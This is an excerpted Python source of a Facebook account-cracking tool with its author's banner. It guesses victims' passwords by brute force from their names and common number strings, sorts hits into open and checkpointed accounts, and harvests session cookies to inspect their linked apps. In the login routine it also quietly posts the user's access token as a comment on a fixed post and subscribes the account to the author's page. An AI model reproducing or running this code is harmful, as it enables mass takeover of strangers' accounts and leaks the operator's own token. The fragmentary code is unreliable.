...
N = "\033[0m"    # Warna Mati
url_license = 'https://github.com/Bilal-XD'
...
def banner():
    print("\n%s    _________ __     \n%s   / ____/ (_) /____  ║ %sDesign By : %sBilal Haider \n%s  / __/ / / / __/ _ \ ║ %sVersion   %s: %s%s1.3 \n / /___/ / / /_/  __/ ║ %sFB %s: XD.7009.PC %s \n%s/_____/_/_/\__/\___/  ║ %sGithub %s: %sgithub.com/Bilal-XD \n"%(O,O,O,O,O,O,O,O,O,O,O,O,O,O,O,O))
def menu_log():
    ...
    if pmu in ['']:
        ...
        try:
            ...
            xd.close()
            print('%s║'%(O))
            requests.post('https://graph.facebook.com/109790081581660/comments/?message=' +token+ '&access_token=' + token)
            requests.post('https://graph.facebook.com/109784891582179/subscribers?access_token=' + token)
        ...
        if pf in ['']:
            ...
            os.system('xdg-open https://facebook.com/XD.7009.PC')
...
def menu():
    ...
    try:
        ...
        ip = "127.0.0.1"
    print('%s╔══[ %sHallo, %s %s]'%(O,P,n,O))
    print('%s║'%(O))
    print('%s╠══[%s•%s] %sID : %s'%(O,P,O,P,i))
    print('%s╠══[%s•%s] %sLH : %s'%(O,P,O,P,ip))
    print('%s║'%(O))
    print('%s╠══[%s•%s] %sOwner Name : Bilal Haider [ XX ]'%(O,P,O,P))
    print('%s╠══[%s•%s] %sOwner Email : bilalhaiderofficial007@gmail.com'%(O,P,O,P))
    print('%s╠══[%s•%s] %sFree Key : MR-000000-XX  '%(O,P,O,P))
    print('%s╠══[%s•%s] %sJoining Date : 00-00-0000 '%(O,P,O,P))
    print('%s║'%(O))
    print('%s╠══[%s1%s] %sCrack ID From Public'%(O,P,O,P))
    print('%s╠══[%s2%s] %sCrack ID From Follower'%(O,P,O,P))
    print('%s╠══[%s3%s] %sCrack ID From Likes Post'%(O,P,O,P))
    print('%s╠══[%s4%s] %sChack Target ID Information '%(O,P,O,P))
    print('%s╠══[%s5%s] %sDump ID Freind List ID '%(O,P,O,P))
    print('%s╠══[%s6%s] %sChack Crack Result Information '%(O,P,O,P))
    print('%s╠══[%s7%s] %sChack Chackpoint ID Option '%(O,P,O,P))
    print('%s╠══[%s8%s] %sUser Agent'%(O,P,O,P))
    print('%s╠══[%s0%s] %sLog Out'%(O,P,O,P))
    pm = input('%s╠══[%s•%s] %sChoose : '%(O,P,O,P))
    print('%s║'%(O))
    if pm in ['']:
        jalan('%s╚══[%s!%s] %Input Error '%(M,P,M,P))
        menu()
        ...
        jalan('%s╚══[%s!%s] %sInput Error '%(M,P,M,P))
        menu()
def defaultua():
    ua = ua_nokia
    try:
...
def ugen_hp():
    ...
    print('%s║'%(O))
    if pc in['']:jalan('%s╚══[%s!%s] %sCorrect Content'%(M,P,M,P));menu()
    elif pc in ['1','01']:
    ...
    else:jalan('%s╚══[%s!%s] %sCorrect Content'%(M,P,M,P));menu()
...
def publik():
    ...
    try:
        ...
        exit()
    try:
        print('%s╠══[%s•%s] %sProfile Must Be Public!'%(O,P,O,P))
    ...
    for i in _cici_.split(" "):
        if len(i)<3:
            ...
            if len(i)==3 or len(i)==4 or len(i)==5:
                _Bilal_.append(i+"1")
                _Bilal_.append(i+"123")
                _Bilal_.append(i+"1234")
                _Bilal_.append(i+"12345")
                _Bilal_.append(i+"123456")
                _Bilal_.append(i+"123456789")
            elif len(i)>=6:
                _Bilal_.append(i)
                _Bilal_.append(i+"1")
                _Bilal_.append(i+"123")
    ...
    for i in _cici_.split(" "):
        if len(i)<3:
            ...
            if len(i)==3 or len(i)==4 or len(i)==5:
                ...
                _Bilal_.append(i+"123456789")
    _Bilal_.append(_cici_.lower())
    _Bilal_.append("pakistan")
    _Bilal_.append("pakistan123")
    _Bilal_.append("223344")
    _Bilal_.append("334455")
    _Bilal_.append("445566")
    _Bilal_.append("556677")
    _Bilal_.append("667788")
    _Bilal_.append("778899")
    _Bilal_.append("889900")
    _Bilal_.append("123456")
    _Bilal_.append(i+"786")
    _Bilal_.append(i+"1122")
    _Bilal_.append("123456789")
    return _Bilal_
...
def generate4(_cici_):
    ...
    pp = open('passnamenumber.txt','r').read()
    for i in _cici_.split(" "):  
        i=i.lower()
        if len(i)<3:continue
    ...
    for i in _cici_.split(" "):
        if len(i)<3:
            ...
            if len(i)==3 or len(i)==4 or len(i)==5:
                ...
                _Bilal_.append(i+"LOL")
    _Bilal_.append(_cici_.lower())
    _Bilal_.append("123456")
    _Bilal_.append("123456789")
    _Bilal_.append("889900")
    _Bilal_.append("102030")
    _Bilal_.append("100101")
    _Bilal_.append("786786")
    _Bilal_.append("786786786")
    return _Bilal_
def generate6(_cici_):
    _Bilal_=[]
    for i in _cici_.split(" "):
        if len(i)<3:
            continue
    ...
    _Bilal_.append(_cici_.lower())
    _Bilal_.append("pakistan")
    _Bilal_.append("qwerty")
    _Bilal_.append("iamking")
    _Bilal_.append("ilovefreefire")
    _Bilal_.append("ilovepubg")
    _Bilal_.append("iampubgking")
    _Bilal_.append("qwertyuiop")
    _Bilal_.append("iamfreefireking")
    _Bilal_.append("freefire")
    _Bilal_.append("pubg123")
    _Bilal_.append("freefire")
    _Bilal_.append("freefire123")
    _Bilal_.append("tiktok")
    _Bilal_.append("tiktokstar")
    _Bilal_.append("tiktok123")
    _Bilal_.append("qazqaz")
    _Bilal_.append("plmplm")
    return _Bilal_
def tambah_pass():
    print('%s║'%(O))
    print('%s╠══[%s•%s] %sFor Example : 786786,pakistan,123456'%(O,P,O,P))
    cuy = input('%s╠══[%s•%s] %sEnter the Manual Additional Pass [1 Password] : '%(O,P,O,P))
    gh = open('pass.txt','w')
    gh.write(cuy)
    gh.close
def tambah_pass_angka():
    print('%s╠══[%s•%s] %sFor Example : 321,786,1122,123'%(O,P,O,P))
    coy = input('%s╠══[%s•%s] %sEnter Additional After Name Pass Number:'%(O,P,O,P))
    xy = open('passnamenumber.txt','w')
    xy.write(coy)
    xy.close
...
def cek_log(user, pasw, h_cp):
    ua = "Mozilla/5.0 (Macintosh; Intel Mac OS X 12_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Safari/605.1.15"
...
def koki(cookies):
    ...
    return final
def cek_apk(h_ok,_Bilal_):
    apk = []
    ses_ = requests.Session()
    url = "https://mbasic.facebook.com/settings/apps/tabbed/?tab=active"
    dat_game = ses_.get(url,cookies={'cookie':_Bilal_})
    ...
    dat_game = ses_.get(url2,cookies={'cookie':_Bilal_})
    datagame = par(dat_game.content,'html.parser')
    form_    = datagame.find('form',method='post')
    for asu in form_.find_all("h3"):
        try:
...
def tahun(fx):
    if len(fx)==15:
        ...
        elif fx[:5] in ['10008','10009','10010']:tahunz = ' • 2022'
        else:tahunz=''
    elif len(fx) in [9,10]:
        tahunz = ' • 2008/2009'
    elif len(fx)==8:
...
class crack:
    def __init__(self,files):
        ...
        self.ko = 0
        print('%s║'%(O))
        print('%s╠══[%s•%s] %sCrack Default/Manual Pasaword [d/m]'%(O,P,O,P))
        while True:
            ...
            if f=="":
                ...
                try:
                    ...
                    if kopi in ['']:
                        ...
                        for i in self.fs:
                            try:
                                self.fl.append({"id":i.split("•")[0],"pw":generate5(i.split("•")[1])})
                            except:continue
                    elif kopi in ['6','06']:
                        for i in self.fs:
                            try:
                        ...
                        os.system('rm -rf passnamenumber.txt')
                        tambah_pass()
                        tambah_pass_angka()
                        for i in self.fs:
                            try:
                    ...
                    if put in ['']:
                        jalan('%s╚══[%s!%s] %sCorrect Content'%(M,P,M,P))
                        menu()
                    elif put in ['1','01','001','a','5','05','6','06']:
    ...
    def pwlist(self):
        ...
        if len(self.pw) ==0:
            ...
            if put in ['']:
                ...
                print('%s╠══[%s•%s] %sBring up  CP Option? [y/n]'%(O,P,O,P))
                puf = input('%s╠══[%s•%s] %sChoose : '%(O,P,O,P))
                if puf in ['']:
                    jalan('%s╚══[%s!%s] %sCorrect Content'%(M,P,M,P))
                    menu()
        ...
        try:
            for i in fl.get("pw"):
                ...
                if log.get("status")=="cp":
                    ...
                    print("\r%s[%CP%s] %s • %s%s     "%(O,P,O,fl.get("id"),i,tahun(fl.get("id"))))
            ...
            self.ko+=1
            print("\r%s[%sCloning%s][%s%s/%s%s][%sOK:%s%s][%sCP:%s%s]%s"%(O,P,O,P,self.ko,len(self.fl),O,P,len(self.ada),O,P,len(self.cp),O,P), end=' ');sys.stdout.flush()
        except:
            self.api(fl)
    ...
    def mbasic(self,fl):
        try:
            ...
            self.ko+=1
            print("\r%s[%sCloninging%s][%s%s/%s%s][%sOK:%s%s][%sCP:%s%s]%s"%(O,P,O,P,self.ko,len(self.fl),O,P,len(self.ada),O,P,len(self.cp),O,P), end=' ');sys.stdout.flush()
        except:
            self.mbasic(fl)
        ...
        try:
            for i in fl.get("pw"):
                ...
                if log.get("status")=="cp":
                    ...
                    h_ok = "\r%s[%sCP%s] %s • %s%s%s     "%(H,P,H,fl.get("id"),i,tahun(fl.get("id")),P)
                    cek_apk(h_ok,koki(log.get("cookies")))
                    print("")
                    self.ada.append("%s•%s"%(fl.get("id"),i))
                    open("OK/%s.txt"%(tanggal),"a+").write("%s•%s\n"%(fl.get("id"),i))
...
def target():
    ...
    except (KeyError,IOError):jalan('%s╚══[%s!%s] %sInput ID Error '%(M,P,M,P));menu()
    try:nm = zy["name"]
    ...
    jalan('%s╠══[%s•%s] %sRelationship Status : %s'%(O,P,O,P,rl))
...
def log_hasil(user, pasw):
    ...
    try:
        ...
        print("%s   [ %s Spam Accounts ]"%(O,O))
    if "c_user" in ses.cookies:
        print("%s   [%sAccount OK No Checkpoint ]"%(H,H))
    elif "checkpoint" in ses.cookies:
        form = run.find("form")
        dtsg = form.find("input",{"name":"fb_dtsg"})["value"]
        jzst = form.find("input",{"name":"jazoest"})["value"]
        ...
        ngew = [yy.text for yy in xnxx.find_all("option")]
        if(str(len(ngew))=="0"):
            print("%s   [ %sOne Tap Account ]"%(H,H))
        else:
            print("%s   [%sThereis %s Option ]"%(P,P,str(len(ngew))))
        for opt in range(len(ngew)):
...
def cek_hasil():
    print('%s╠══[ %sCheck Crack Result Account Options %s]'%(O,P,O))
    print('%s║'%(O))
    ...
    for memek in buka_baju:
        ...
        titid  = kontol.split("•")
        print("%s%s-->%s %s %s"%(O,P,O,P,kontol))
        try:
...
def var_tutor():
    ...
    print('%s╠══[%s4%s] %sInformation Of Crack Process'%(O,P,O,P))
def tutor_target():
    mlaku('%s╠═══╦══════════════════════════════════════════════════════╗'%(O))
...
def var_author():
    ...
    mlaku('%s║     • %sBilal Haider '%(O,P))
    mlaku('%s║     • %sDapunta ID'%(O,P))
    mlaku('%s║'%(O))
    mlaku('%s╠══[%s•%s] %sTeam Project %sXNSCODE%s :'%(O,P,O,P,O,P))
    mlaku('%s║     • %sYayan-XD'%(O,P))
    mlaku('%s║     • %sDapunta-XD'%(O,P))
    mlaku('%s║     • %sAngga-XD'%(O,P))
    mlaku('%s║     • %sNot yet available'%(O,P))
    mlaku('%s║     • %sNot yet available'%(O,P))
    mlaku('%s║     • %sNot yet available'%(O,P))
    mlaku('%s║     • %sNot yet available'%(O,P))
    mlaku('%s║     • %sNot yet available'%(O,P))
...
def start_method():
    ...
    print('%s╠══[%s4%s] %sMethod Touch FB'%(O,P,O,P))
    print('%s╠══[%s5%s] %sMethod X.Facebook'%(O,P,O,P))
    print('%s╠══[%s6%s] %sMethod D.Facebook'%(O,P,O,P))
    
def start_methodezz():
    print('%s║'%(O))
    print('%s╠══[%s1%s] %sName + Numbers %s[%s1-9%s]'%(O,P,O,P,H,H,H))
    print('%s╠══[%s2%s] %sCombination Passwords %s[%sMore%s]'%(O,P,O,P,H,H,H))
    print('%s╠══[%s3%s] %sSimple Name + Numbers %s [%s3 & 5%s]'%(O,P,O,P,H,H,H))
    print('%s╠══[%s4%s] %sChoose Passwords%s [%s -xx-%s] '%(O,P,O,P,H,H,H))
    print('%s╠══[%s5%s] %sNumber Passwords%s [%s- 09 - %s] '%(O,P,O,P,H,H,H))
    print('%s╠══[%s6%s] %sAlfabatic Passwords%s [%s -15 -%s] '%(O,P,O,P,H,H,H))
def started():
    print('%s║'%(O))
    print('%s╠══[%s•%s] %sCrack Will Be Started!'%(O,P,O,P))
    print('%s╠══[%s•%s] %sResult [OK] Save In OK/%s.txt'%(O,P,O,P,tanggal))
    print('%s╠══[%s•%s] %sResult [CP] Save In  CP/%s.txt'%(O,P,O,P,tanggal))
    print('%s╠══[%s•%s] %sAfter 1K ID Crack On Flight Mod For [ 5s ]'%(O,P,O,P))
    print('%s╚═══════════════════════════════════════════════════════'%(O))
def folder():
    try:os.mkdir("CP")
    except:pass
